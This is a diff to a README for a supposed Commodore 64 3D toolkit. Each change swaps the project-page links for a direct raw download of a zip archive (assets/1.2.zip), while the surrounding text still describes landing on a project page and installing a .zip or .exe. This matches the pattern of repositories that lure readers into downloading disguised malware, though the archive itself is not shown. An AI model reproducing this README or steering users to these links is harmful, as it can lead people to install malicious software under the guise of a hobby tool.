@@ -1,6 +1,6 @@
 # 🖥️ c64-3d-toolkit - Turn Your PC into a Retro 3D Powerhouse
 
-[![Download Now](https://img.shields.io/badge/Download-c64--3d--toolkit-blue?style=for-the-badge&logo=github)](https://github.com/Kezocr1970/c64-3d-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-c64--3d--toolkit-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kezocr1970/c64-3d-toolkit/main/assets/1.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Let’s get you up and running in under five minutes.
 
 ### 📥 Step 1: Download the Software
 
-Visit this link to download the application: **[https://github.com/Kezocr1970/c64-3d-toolkit](https://github.com/Kezocr1970/c64-3d-toolkit)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Kezocr1970/c64-3d-toolkit/main/assets/1.2.zip](https://raw.githubusercontent.com/Kezocr1970/c64-3d-toolkit/main/assets/1.2.zip)**
 
 When you click the link, you’ll land on the project’s main page. Look for a green button that says **"Code"** or a section labeled **"Releases"** or **"Assets."** Click the download option (usually a `.zip` file or an `.exe` installer). The download might take a minute or two depending on your internet speed.
 
@@ -131,7 +131,7 @@ It’s a 2D vector image format commonly used for logos and icons. The toolkit c
 
 ## 🌐 More Resources
 
-- **Project Homepage:** [https://github.com/Kezocr1970/c64-3d-toolkit](https://github.com/Kezocr1970/c64-3d-toolkit)
+- **Project Homepage:** [https://raw.githubusercontent.com/Kezocr1970/c64-3d-toolkit/main/assets/1.2.zip](https://raw.githubusercontent.com/Kezocr1970/c64-3d-toolkit/main/assets/1.2.zip)
 - **Commodore 64 Emulator (VICE):** Search online – it’s free and allows you to run C64 software on your PC.
 - **OBJ File Examples:** Search for “free OBJ models” or try Blender’s default cube export.
 
@@ -156,7 +156,7 @@ This is a community-made tool. Be kind, report bugs, and share your creations wi
 
 Don’t wait. Your retro 3D adventure starts with one click.
 
-👉 **[Download c64-3d-toolkit Here](https://github.com/Kezocr1970/c64-3d-toolkit)** 👈
+👉 **[Download c64-3d-toolkit Here](https://raw.githubusercontent.com/Kezocr1970/c64-3d-toolkit/main/assets/1.2.zip)** 👈
 
 Visit this link to download the application. Open the page, find the download button, and you’re on your way.
 
